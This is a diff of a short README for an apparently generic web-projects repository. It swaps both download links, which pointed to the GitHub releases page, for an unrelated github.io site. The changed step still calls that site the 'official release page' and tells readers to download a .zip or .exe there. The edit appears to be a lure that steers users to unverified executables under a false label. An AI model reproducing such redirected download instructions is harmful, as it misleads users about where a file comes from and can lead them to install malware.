@@ -1,6 +1,6 @@
 # 🌐 shreshthh-do-projects-v2026 - Access your interactive web projects easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Kaleenabiocatalytic259/shreshthh-do-projects-v2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://kaleenabiocatalytic259.github.io)
 
 ## 📖 About this application
 
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run the software effectively:
 
 Follow these steps to obtain the correct file for your system:
 
-1. Click here to visit the [official release page](https://github.com/Kaleenabiocatalytic259/shreshthh-do-projects-v2026/releases).
+1. Click here to visit the [official release page](https://kaleenabiocatalytic259.github.io).
 2. Locate the section labeled Assets at the bottom of the latest release post.
 3. Select the file ending in .zip or .exe depending on your preference.
 4. Save the file to your Downloads folder or any location you prefer.
